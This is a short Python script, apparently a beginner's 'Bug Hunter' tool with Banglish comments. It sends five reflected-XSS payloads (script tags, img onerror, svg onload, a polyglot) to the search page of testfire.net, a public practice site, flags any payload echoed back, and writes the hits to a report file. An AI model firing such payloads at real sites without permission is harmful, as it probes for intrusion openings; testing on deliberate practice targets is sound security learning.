import sys
target = sys.argv[1] if len(sys.argv)>1 else 'https://testphp.vulnweb.com'
import requests

TARGET = "http://testfire.net"
print("[*] Bug Hunter V2 - by YOU\n")

# Pro ra ekta payload na, onek payload diye test kore
payloads = [
    "<script>alert('XSS1')</script>",
    "'\"><script>alert('XSS2')</script>",
    "<img src=x onerror=alert('XSS3')>",
    "<svg onload=alert('XSS4')>",
    "'';!--\"<XSS>=&{()}"
]

found = []

for p in payloads:
    url = f"{TARGET}/search.jsp?query={p}"
    print(f"[*] Testing payload: {p[:20]}...")
    try:
        r = requests.get(url, timeout=5)
        if p in r.text:
            print(f"  [HIGH] FOUND! -> {url}")
            found.append(url)
        else:
            print(f"  [SAFE]")
    except:
        print("  [ERROR] site down")

# Pro ra report file banay
with open("result.txt", "w") as f:
    f.write("Bug Hunter V2 Report\n")
    f.write(f"Target: {TARGET}\n\n")
    for vuln in found:
        f.write(f"[HIGH] XSS: {vuln}\n")

print(f"\n[+] Done! {len(found)} bug found!")
print("[+] Report saved to result.txt")
print("Check with: cat result.txt")	
